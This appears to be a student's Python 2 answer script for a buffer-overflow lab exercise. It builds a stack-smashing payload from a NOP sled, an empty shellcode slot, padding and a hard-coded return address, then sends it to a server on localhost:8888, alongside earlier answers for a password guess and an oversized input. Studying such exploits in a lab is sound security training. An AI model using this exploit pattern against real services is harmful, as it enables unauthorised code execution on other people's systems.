import sys
import socket

  ##########
  # Q4   #
  ##########
#output = 'letmein23333333'
  ##########
  # Q7 #
  # Example: to print 100 x90's use ("\x90" * 100)
  ##########
#output = "\x01" * 513

  ##########
  # Q8/9 #
  ##########
shellcode = "";


string1 = "\x90" * 100 # to authenticate the client
string2 = "A"*330
#returnaddr = "\xbf\xff\xe6\x4f" #somewhere in NOP
returnaddr = "\x4f\xe6\xff\xbf" #somewhere in NOP
output = string1+shellcode+string2+returnaddr

#print("length of shellcode=",len(shellcode),"\n") #print length of shellcode
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 8888)
sock.connect(server_address)
print >>sys.stderr, 'connecting to %s port %s' % server_address
sock.sendall(output)

